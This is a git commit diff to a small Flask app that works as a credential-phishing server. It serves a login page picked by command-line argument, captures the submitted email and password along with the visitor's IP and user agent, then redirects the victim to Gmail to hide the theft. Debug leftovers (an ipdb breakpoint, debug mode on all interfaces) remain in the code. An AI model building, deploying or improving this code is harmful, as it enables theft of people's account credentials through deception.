d0610e8dbd26597e80f38ff924adf49248c1311c
root <root@localhost.localdomain>
2018-08-15 18:05:06 +0200

    Added new functs.

--- code/app.py
+++ code/app.py
@@ -1,24 +1,22 @@
-from flask import Flask, request, render_template
-
+import sys
+from flask import Flask, request, render_template, redirect
 
 app = Flask(__name__)
 
 
 @app.route('/', methods=['GET', 'POST'])
 def hello_world():
+    target = sys.argv[1]
     if request.method == 'POST':
-
         email = request.form['email']
         passwd = request.form['password']
-        
-        # TODO: request.user_agent and more data to add in reports.
-
-        print('Email: {}'.format(email))
-        print('Password: {}'.format(passwd))
-        print(request.remote_addr)
+        import ipdb; ipdb.set_trace()
+        ip_addr = request.remote_addr
+        user_agent = request.user_agent
 
         # redirect a donde toque
-    return render_template('index.html', name='index')
+        return redirect("https://www.gmail.com", code=302)
+    return render_template(target, name='index')
 
 if __name__ == '__main__':
     app.run(debug=True,host='0.0.0.0')
